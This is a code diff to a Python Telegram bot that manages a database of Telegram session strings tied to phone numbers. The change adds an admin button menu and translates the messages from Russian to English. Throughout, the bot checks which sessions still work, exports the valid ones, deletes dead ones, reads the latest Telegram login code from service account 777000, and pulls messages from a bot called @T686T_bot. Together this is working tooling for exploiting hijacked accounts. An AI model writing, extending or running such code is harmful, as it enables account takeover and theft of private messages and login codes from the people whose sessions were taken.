@@ -3,6 +3,7 @@ import json
 import logging
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from dotenv import load_dotenv
 from pymongo import MongoClient
 from telethon import TelegramClient
@@ -10,7 +11,7 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.messages import GetHistoryRequest
 from phonenumbers import parse, geocoder
 
-# Load env
+# Load .env
 load_dotenv()
 
 API_ID = int(os.getenv("API_ID"))
@@ -41,15 +42,73 @@ def is_main_admin(uid):
 def is_light_admin(uid):
     return uid == LA_ADMIN_ID
 
+@dp.message_handler(commands=['start'])
+async def cmd_start(message: types.Message):
+    if is_main_admin(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(row_width=2).add(
+            InlineKeyboardButton("✅ Check Sessions", callback_data='log'),
+            InlineKeyboardButton("📂 Export Valids", callback_data='loger'),
+            InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
+            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
+            InlineKeyboardButton("📨 FA Bot History", callback_data='fa')
+        )
+        await message.answer("👑 Welcome, Admin! Choose an action:", reply_markup=keyboard)
+
+    elif is_light_admin(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(row_width=2).add(
+            InlineKeyboardButton("✅ Check My Sessions", callback_data='log'),
+            InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
+            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
+            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
+            InlineKeyboardButton("🗑 Delete All My Sessions", callback_data='delall')
+        )
+        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
+    else:
+        await message.answer("❌ You don't have access to use this bot.")
+
+@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall'])
+async def process_callback(callback_query: types.CallbackQuery):
+    cmd = callback_query.data
+    uid = callback_query.from_user.id
+
+    if cmd == 'log':
+        await bot.send_message(uid, "/log")
+    elif cmd == 'loger':
+        if is_main_admin(uid):
+            await bot.send_message(uid, "/loger")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'validel':
+        if is_main_admin(uid):
+            await bot.send_message(uid, "/validel")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'login':
+        await bot.send_message(uid, "Send:\n`/login +1234567890`", parse_mode="Markdown")
+    elif cmd == 'fa':
+        await bot.send_message(uid, "Send:\n`/fa +1234567890`", parse_mode="Markdown")
+    elif cmd == 'addla':
+        if is_light_admin(uid):
+            await bot.send_message(uid, "Send session list as JSON:\n`/addla [{\"phone\": \"+123\", \"session\": \"...\"}]`", parse_mode="Markdown")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+    elif cmd == 'delall':
+        if is_light_admin(uid):
+            result = light_sessions_col.delete_many({})
+            await bot.send_message(uid, f"🗑 Removed your sessions: {result.deleted_count}")
+        else:
+            await bot.send_message(uid, "❌ Not allowed.")
+
+    await callback_query.answer()
+
 @dp.message_handler(commands=['addla'])
 async def add_light_admin_session(message: types.Message):
     if not is_light_admin(message.from_user.id):
         return
-
     try:
         data = json.loads(message.get_args())
         if not isinstance(data, list):
-            raise ValueError("Формат должен быть списком JSON")
+            raise ValueError("Format must be a JSON list")
 
         added = 0
         for item in data:
@@ -62,25 +121,19 @@ async def add_light_admin_session(message: types.Message):
                     upsert=True
                 )
                 added += 1
-
-        await message.reply(f"✅ Добавлено сессий: {added}")
+        await message.reply(f"✅ Sessions added: {added}")
     except Exception as e:
-        await message.reply(f"❌ Ошибка при добавлении: {e}")
+        await message.reply(f"❌ Error: {e}")
 
 @dp.message_handler(commands=['log'])
 async def cmd_log(message: types.Message):
-    if is_main_admin(message.from_user.id):
-        sessions = list(sessions_col.find({}))
-    elif is_light_admin(message.from_user.id):
-        sessions = list(light_sessions_col.find({}))
-    else:
-        return
-
+    col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
+    sessions = list(col.find({}))
     if not sessions:
-        await message.answer("❌ Нет сессий.")
+        await message.answer("❌ No sessions found.")
         return
 
-    await message.answer("🔍 Проверка сессий...")
+    await message.answer("🔍 Checking sessions...")
     results = []
     for session in sessions:
         phone = session.get("phone")
@@ -88,19 +141,16 @@ async def cmd_log(message: types.Message):
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
         try:
             await client.connect()
-            auth = await client.is_user_authorized()
-            if not auth:
-                results.append(f"❌ {phone} — невалид")
+            if not await client.is_user_authorized():
+                results.append(f"❌ {phone} — Invalid session")
             else:
                 me = await client.get_me()
                 country = geocoder.description_for_number(parse(phone, None), "en")
                 premium = getattr(me, 'premium', False)
                 blocked = bool(getattr(me, 'restriction_reason', []))
-                results.append(
-                    f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}"
-                )
+                results.append(f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}")
         except Exception as e:
-            results.append(f"❌ {phone} — ошибка: {e}")
+            results.append(f"❌ {phone} — Error: {e}")
         finally:
             await client.disconnect()
 
@@ -115,7 +165,6 @@ async def cmd_loger(message: types.Message):
 
     sessions = list(sessions_col.find({}))
     valid_sessions = []
-
     for session in sessions:
         phone = session.get("phone")
         session_str = session.get("session")
@@ -130,7 +179,7 @@ async def cmd_loger(message: types.Message):
             await client.disconnect()
 
     if not valid_sessions:
-        await message.answer("❌ Нет валидных сессий.")
+        await message.answer("❌ No valid sessions.")
         return
 
     with open("valid_sessions.txt", "w") as f:
@@ -145,10 +194,8 @@ async def cmd_validel(message: types.Message):
 
     sessions = list(sessions_col.find({}))
     deleted = 0
-
     for session in sessions:
-        session_str = session.get("session")
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
         try:
             await client.connect()
             if not await client.is_user_authorized():
@@ -160,7 +207,7 @@ async def cmd_validel(message: types.Message):
         finally:
             await client.disconnect()
 
-    await message.answer(f"🧹 Удалено невалидных сессий: {deleted}")
+    await message.answer(f"🧹 Invalid sessions removed: {deleted}")
 
 @dp.message_handler(commands=['login'])
 async def cmd_login(message: types.Message):
@@ -169,36 +216,26 @@ async def cmd_login(message: types.Message):
 
     args = message.get_args().strip()
     if not args.startswith('+'):
-        await message.reply("❗ Укажи номер телефона в формате: /login +391234567890")
+        await message.reply("❗ Use format: /login +1234567890")
         return
 
     col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
     session = col.find_one({"phone": args})
     if not session:
-        await message.reply("❌ Сессия с этим номером не найдена.")
+        await message.reply("❌ Session not found.")
         return
 
     client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
     try:
         await client.connect()
-        history = await client(GetHistoryRequest(
-            peer=777000,
-            limit=1,
-            offset_date=None,
-            offset_id=0,
-            max_id=0,
-            min_id=0,
-            add_offset=0,
-            hash=0
-        ))
-
+        history = await client(GetHistoryRequest(peer=777000, limit=1, offset_date=None,
+                                                 offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
         if history.messages:
-            text = history.messages[0].message
-            await message.reply(f"📨 Последний код от Telegram:\n\n`{text}`", parse_mode="Markdown")
+            await message.reply(f"📨 Last Telegram code:\n\n`{history.messages[0].message}`", parse_mode="Markdown")
         else:
-            await message.reply("⚠️ Нет сообщений от Telegram (777000).")
+            await message.reply("⚠️ No messages from Telegram.")
     except Exception as e:
-        await message.reply(f"❌ Ошибка: {e}")
+        await message.reply(f"❌ Error: {e}")
     finally:
         await client.disconnect()
 
@@ -209,37 +246,28 @@ async def cmd_fa(message: types.Message):
 
     args = message.get_args().strip()
     if not args.startswith('+'):
-        await message.reply("❗ Укажи номер телефона в формате: /fa +391234567890")
+        await message.reply("❗ Use format: /fa +1234567890")
         return
 
     col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
     session = col.find_one({"phone": args})
     if not session:
-        await message.reply("❌ Сессия с этим номером не найдена.")
+        await message.reply("❌ Session not found.")
         return
 
     client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
     try:
         await client.connect()
-        history = await client(GetHistoryRequest(
-            peer='T686T_bot',
-            limit=25,
-            offset_date=None,
-            offset_id=0,
-            max_id=0,
-            min_id=0,
-            add_offset=0,
-            hash=0
-        ))
-
+        history = await client(GetHistoryRequest(peer='T686T_bot', limit=25, offset_date=None,
+                                                 offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
         if not history.messages:
-            await message.reply("⚠️ Нет сообщений в бота @T686T_bot.")
+            await message.reply("⚠️ No messages in @T686T_bot.")
             return
 
         output = "\n\n".join([f"✉️ {msg.message}" for msg in history.messages if msg.message])
-        await message.reply(f"📤 Последние сообщения в @T686T_bot:\n\n{output}")
+        await message.reply(f"📤 Last messages from @T686T_bot:\n\n{output}")
     except Exception as e:
-        await message.reply(f"❌ Ошибка: {e}")
+        await message.reply(f"❌ Error: {e}")
     finally:
         await client.disconnect()
 
